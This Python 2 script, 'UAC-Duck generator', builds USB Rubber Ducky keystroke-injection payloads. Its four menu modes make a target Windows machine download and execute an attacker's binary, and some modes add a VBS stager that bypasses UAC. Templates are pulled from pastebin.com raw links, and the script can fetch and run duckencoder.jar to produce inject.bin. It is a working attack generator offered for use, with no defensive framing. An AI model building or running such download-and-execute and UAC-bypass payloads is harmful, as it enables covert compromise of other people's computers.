import sys
import urllib
import urllib2
import time
import os

def genscripton():
	if os.path.isfile('DuckyScript.txt'):
		os.remove('DuckyScript.txt')
		
	print "[+]Please input your UAC VBS Payload URL (Pastebin/RAW recommended Example: http://pastebin.com/raw/VBSPAYLOAD ):"
	genpayon_url = raw_input().lower()
	
	print "[+]Please input your Payload save filename (Example: update.vbs):"
	genpayon_name = raw_input().lower()
	
	if not genpayon_name and genpayon_url:
		print 'Using deafult params' 
		with open('DuckyScript.txt', 'a') as the_file:
			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
			txt = txt.replace('[URL]', genpayon_url)
			txt = txt.replace('[NAME]', "update.vbs")
			the_file.write(txt)
		print 'Payload DuckyScript.txt generated!!' 
		time.sleep(2)
		main()
		
	elif genpayon_name.endswith(".vbs") and genpayon_url:
		with open('DuckyScript.txt', 'a') as the_file:
			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
			txt = txt.replace('[URL]', genpayon_url)
			txt = txt.replace('[NAME]', genpayon_name)
			the_file.write(txt)
		print 'Payload DuckyScript.txt generated!!' 
		time.sleep(2)
		main()
		
	else:
		print "Please input a valid URL"
		genscripton()
		
def duckencode():
	if os.path.isfile('duckencoder.jar'):
		print "Would you like to encode the ducky script? (Yes/No y/n)?"
		yesno = raw_input().lower()
		yes = set(['yes','y'])
		no = set(['no','n'])
			
		if yesno in yes:
		   
			print "Input your keyboard lang, if empty English GB will be used (US, SE, FR etc (Without '-')?"
			lang = raw_input().lower()
			if not lang:
				os.system("java -jar duckencoder.jar -i DuckyScript.txt -o inject.bin")
			else: os.system("java -jar duckencoder.jar -i DuckyScript.txt -o inject.bin -l" + lang)
			main()
		elif yesno in no:
		   main()	
		else:
		   print "Please answer Yes(y) or No(n)"
		print "Success! Encoded script saved as 'inject.bin'"
	else: duckencodedownload()
		
def duckencodedownload():
	print "We could not find 'duckencoder.jar' in the current path, would you like to download it(Yes/No y/n)?"
	yesnod = raw_input().lower()
	yes = set(['yes','y'])
	no = set(['no','n'])
			
	if yesnod in yes:
		
		Duckencoderjarc = urllib2.urlopen("http://github.com/hak5darren/USB-Rubber-Ducky/raw/master/duckencoder.jar")
		with open('Duckencoder.jar','wb') as output:
			output.write(Duckencoderjarc.read())
			print 'Duckencoder.jar acquired!' 
		duckencode()
	elif yesnod in no:
		main()	
	else:
		print "Please answer Yes(y) or No(n)"

def genuacoff():
	
	print "-> Ducky D&E Blazing fast payload (WITH  UAC bypass) Offline <- "
	print "----------------------------------------------------------------"
	
	if os.path.isfile('DuckyScript.txt'):
		os.remove('DuckyScript.txt')
		
	
	print "[+]Please input your binary payload name located on the drive(Example: update.exe):"
	genpayon_payloadname = raw_input().lower()
	
	print "[+]Please input your desired UAC VBS local filename(Example: update.vbs):"
	genpayon_stagername = raw_input().lower()
	
	print "[+]Please input your Twin-Duck drivename (Example: backup ):"
	genpayon_drivename = raw_input().lower()
	
	if genpayon_drivename:
		if genpayon_payloadname.endswith(".exe") and genpayon_stagername.endswith(".vbs"):
			with open(genpayon_stagername, 'a') as the_file:
				txt = urllib.urlopen("http://pastebin.com/raw/GBZZsPEe").read()
				txt = txt.replace('[NAME]', genpayon_payloadname)
				the_file.write(txt)
			print 'VBS Stager "' + genpayon_stagername + '" generated!' 
			time.sleep(3)
			with open("DuckyScript.txt", 'a') as the_file:
				txt = urllib.urlopen("http://pastebin.com/raw/mXLM5hrC").read()
				txt = txt.replace('[NAME]', genpayon_stagername)
				txt = txt.replace('[DRIVENAME]', genpayon_drivename)
				the_file.write(txt)
			print 'Payload DuckyScript.txt generated!!'
			print 'Please place the "' + genpayon_stagername + '" file and your "' + genpayon_payloadname + '" on your rubber-ducky with drivename "' + genpayon_drivename + '" drive';
			time.sleep(10)
			main()
		else:
			print "Please input a valid payload and/or stager local filename ( Must end with .vbs/.exe)"
			genuacoff()	
	else:
		print "Please input a USB drivename"
		genuacoff()
	
def genuac():
	if os.path.isfile('UAC-Duck-Payload.vbs'):
		os.remove('UAC-Duck-Payload.vbs')
		
	print "-> Ducky D&E Blazing fast payload (WITH  UAC bypass) Online <- "
	print "---------------------------------------------------------------"
	print "[+]Please input your binary payload direct link URL( Example: www.example.com/pay.exe):"
	genpayon_url = raw_input().lower()
	
	print "[+]Please input your Payload save filename (Deafult: update.exe):"
	genpayon_name = raw_input().lower()
	
	if not genpayon_name:
		print 'Using deafult params' 
		with open('UAC-Duck-Payload.vbs', 'a') as the_file:
			txt = urllib.urlopen("http://pastebin.com/raw/apyPSqWs").read()
			txt = txt.replace('[URL]', genpayon_url)
			txt = txt.replace('[NAME]', "update.exe")
			the_file.write(txt)
		print "Payload UAC-Duck-Payload.vbs generated!"
		print "Please upload this .vbs file as raw text format to a webserver(Pastebin works great)"
		time.sleep(2)
		genscripton()
	elif genpayon_name.endswith(".exe") and genpayon_url.endswith(".exe"):
		with open('UAC-Duck-Payload.vbs', 'a') as the_file:
			txt = urllib.urlopen("http://pastebin.com/raw/apyPSqWs").read()
			txt = txt.replace('[URL]', genpayon_url)
			txt = txt.replace('[NAME]', genpayon_name)
			the_file.write(txt)
		print "Payload UAC-Duck-Payload.vbs generated!"
		print "Please upload this .vbs file as raw text format to a webserver(Pastebin works great)"
		time.sleep(2)
		genscripton()
	else:
		print "Please input a valid savename/URL ( Must end with .exe)"
		genuac()


def genoff():
	if os.path.isfile('DuckyScript.txt'):
		os.remove('DuckyScript.txt')
		
	print "-> Ducky D&E Blazing fast payload (Without UAC bypass) Offline <- "
	print "------------------------------------------------------------------"
	
	print "[+]Please input your binary payload name located on the drive(Example: update.exe):"
	genpayon_name = raw_input().lower()

	
	print "[+]Please input your Twin-Duck drivename (Example: backup ):"
	genpayon_drivename = raw_input().lower()
	
	

	if genpayon_name.endswith(".exe"):
		with open('DuckyScript.txt', 'a') as the_file:
			txt = urllib.urlopen("http://pastebin.com/raw/mXLM5hrC").read()
			txt = txt.replace('[DRIVENAME]', genpayon_drivename)
			txt = txt.replace('[NAME]', genpayon_name)
			the_file.write(txt)
		print 'Payload DuckyScript.txt generated!!' 
		print "Remember to place your "' +  genpayon_name + '" payload on the ducky drive and rename the drive accordingly" 
		time.sleep(5) 
		main()
	else:
		print "Please input a valid binary payload and drivename"
		genoff()
		
		
	
def gen():

	if os.path.isfile('DuckyScript.txt'):
		os.remove('DuckyScript.txt')
		
	print "-> Ducky D&E Blazing fast payload (Without UAC bypass) Online <- "
	print "-----------------------------------------------------------------"
	
	print "[+]Please input your binary payload direct link URL( www.example.com/pay.exe):"
	genpayon_url = raw_input().lower()
	
	print "[+]Please input your Payload save filename (Deafult: update.exe):"
	genpayon_name = raw_input().lower()
	
	if not genpayon_name:
		print 'Using deafult params' 
		with open('DuckyScript.txt', 'a') as the_file:
			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
			txt = txt.replace('[URL]', genpayon_url)
			txt = txt.replace('[NAME]', "update.exe")
			the_file.write(txt)
		print 'Payload DuckyScript.txt generated!!' 
		time.sleep(2)
		main()
	elif genpayon_name.endswith(".exe") and genpayon_url.endswith(".exe"):
		with open('DuckyScript.txt', 'a') as the_file:
			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
			txt = txt.replace('[URL]', genpayon_url)
			txt = txt.replace('[NAME]', genpayon_name)
			the_file.write(txt)
		print 'Payload DuckyScript.txt generated!!' 
		time.sleep(2)
		main()
	else:
		print "Please input a valid savename/URL ( Must end with .exe)"
		gen()
		
		

				
	
def main():
	
	print """
	  _   _  _   ___   ___  _   _  ___ _  __
	 | | | |/_\ / __| |   \| | | |/ __| |/ /
	 | |_| / _ \ (__  | |) | |_| | (__| ' < 
	  \___/_/ \_\___| |___/ \___/ \___|_|\_\ 
											
	[+++++++++++++++++++++++++++++++++++++++]            
	"""
	print "Welcome to UAC-Duck generator By Skiddie"
	print "What would you like to do?"
	print ""
	print ""
	print "[-------------ONLINE-VERSION-------------------]"
	print "[1] - Generate binary download & execute ducky script (Without UAC bypass)"
	print "[2] - Generate binary download & execute ducky script (With UAC bypass - 2 stager)"
	print ""
	print "[-------------OFFLINE-VERSION-------------------]"
	print "[3] - Generate binary download & execute ducky script (Without UAC bypass)"
	print "[4] - Generate binary download & execute ducky script (With UAC bypass - 2 stager)"
	
	choice = raw_input().lower()

	DeNoUac = set(['1','[1]'])
	DeUAC = set(['2','[2]'])
	DeNoUacOff = set(['3','[3]'])
	DeUACOff = set(['4','[4]'])


	if choice in DeNoUac:
	   gen()
	elif choice in DeUAC:
	   genuac()
	elif choice in DeNoUacOff:
	   genoff()
	elif choice in DeUACOff:
	   genuacoff()
	else:
	   print "Please input a number corresponding with your choose(1,2,3,4)"
		
	   
main()
   


   
